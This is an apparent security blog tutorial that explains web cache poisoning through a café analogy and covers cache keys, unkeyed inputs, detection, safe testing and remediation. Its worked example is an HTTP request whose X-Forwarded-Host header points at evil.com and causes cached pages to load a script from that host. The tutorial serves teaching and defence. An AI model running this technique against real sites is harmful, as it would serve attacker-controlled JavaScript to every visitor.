Web Cache Poisoning: How One Bad Response Becomes Everyone's Problem

Dhanusha K · Oct 03, 2026 · 10 min read

Most XSS bugs hit one victim at a time. You craft a link, you send it, you hope they click. Cache poisoning is different. You poison the response once, and the server serves it to everyone, for you.

Think of it as the difference between handing out a fake flyer to one person and sneaking it onto the notice board that everyone reads.

Start With the Analogy: The Busy Café

Imagine a café with one barista and a long queue. Customers keep ordering the same "Latte, medium." Making each one from scratch is slow, so the barista starts keeping a few pre-made lattes on the counter. If someone orders a medium latte, they grab one from the counter. It's fast, and the barista is happy.

That counter is the cache. The barista is your origin server. A CDN like Cloudflare, Akamai, or Fastly is just a very big counter in front of the kitchen.

Now the attack: someone sneaks up and slips something nasty into one of those pre-made lattes. The barista doesn't notice, because they think every latte on the counter is trustworthy. Every customer who orders a medium latte now gets the bad one.

That's web cache poisoning.

The Core Concept: The Cache Key

A cache needs a way to decide: "Is this new request the same as one I've already answered?"

It does this by building a cache key from a few parts of the request, typically:

  • The request method (GET)
  • The path (/home)
  • The query string (?lang=en)
  • The Host header

If two requests produce the same cache key, the cache says "I've seen this one" and serves the saved response.

Everything in the request that is not part of the cache key is called an unkeyed input. The cache ignores it when matching, but the server may still use it when building the response.

The whole attack lives in that gap: an input that changes the response but isn't part of the cache key.

The Recipe: Poisoning in Two Steps

Every cache poisoning attack follows the same pattern:

  1. Find an unkeyed input that influences the response.
  2. Get the cache to store your poisoned version, so normal users receive it.

A Worked Example

Say you're testing a site that builds absolute URLs for its scripts using the X-Forwarded-Host header (a common behavior behind proxies):

GET /home HTTP/1.1
Host: shop.example.com
X-Forwarded-Host: evil.com

The server replies with:

<script src="https://evil.com/static/app.js"></script>

The server trusted a header it shouldn't have. On its own, that only affects you, since you're the one sending the header. This is where the cache turns it into a mass attack.

The cache key for this request is GET /home plus the Host. X-Forwarded-Host is not part of it. So the cache stores your poisoned response under the key for /home.

Now a normal user visits:

GET /home HTTP/1.1
Host: shop.example.com

The cache sees the same key, serves the stored response, and the user's browser loads app.js from evil.com. That's JavaScript execution for every visitor, with no click on a crafted link required.

How to Spot a Cache in the Wild

Before you attack anything, confirm a cache is even there. Look at the response headers:

HeaderWhat it tells you
X-Cache: hit/missWhether this response came from the cache
Age: 42How many seconds the response has been cached
Cache-Control: max-age=...How long it will be cached
Via,CF-Cache-Status,X-Served-ByWhich CDN or proxy is involved

If you send the same request twice and the second one says hit or shows an Age value, you've found a cache.

How to Test Safely: Use a Cache Buster

This part is important. If you test on a live site, you could genuinely poison responses for real users. To avoid that, add a unique cache buster to every test request so you get your own private cache entry:

GET /home?cb=dhanu-test-8291 HTTP/1.1

Change the value each time you want a fresh entry. Your poisoned response then stays in a cache slot nobody else will ever request. Only test with the client's authorization and within scope, and prefer a lab or staging environment when you can.

Finding Unkeyed Inputs

Guessing headers by hand is slow. The common workflow is:

  1. Burp's Param Miner extension: right-click a request and run "Guess headers". It brute-forces header names and watches for changes in the response.
  2. Look for candidates likeX-Forwarded-Host,X-Forwarded-Scheme,X-Original-URL,X-Host,and unkeyed cookies or query parameters.
  3. For each candidate, check whether it changes the response and whether it is ignored by the cache key. You need both.

What Can Go Wrong (Impact)

The impact depends on what the poisoned response contains:

  • Stored-style XSS at scale, by injecting a script source or reflecting a payload into a cached page
  • Malicious redirects, by poisoning a redirect response to point at an attacker's site
  • Denial of service, by caching an error page (for example a 400 or 500) so the real page becomes unreachable
  • Resource hijacking, by swapping out JS or CSS files that load on every page

Poisoning a popular page like the homepage multiplies all of these.

Don't Confuse It With Web Cache Deception

They sound similar, but they're opposites:

Cache Poisoning Cache Deception
Goal Make the cache store a malicious response for others Trick the cache into storing a victim's private response so you can read it
Who is attacked Every user who receives the cached response One specific victim
Example Your injected header ends up in the cached homepage A victim visits /account/profile.css and their account page gets cached

Poisoning is about putting something bad in. Deception is about getting something private out.

How to Fix It

For your report's remediation section:

  • Don't use unkeyed inputs to build responses. If a header changes the output, it should be in the cache key, or ignored entirely.
  • Disable caching on dynamic or sensitive responses, and never cache error pages for long.
  • Strip or reject unexpected headers such as X-Forwarded-Host at the edge.
  • Validate and encode anything reflected from headers, just as you would for any user input.
  • Configure the CDN to cache only truly static content.

The One-Line Takeaway

A cache trusts its key. If something outside the key can change the response, you can slip a bad response in once, and the cache will serve it to everyone.

Same café, one spoiled latte, a very long queue.
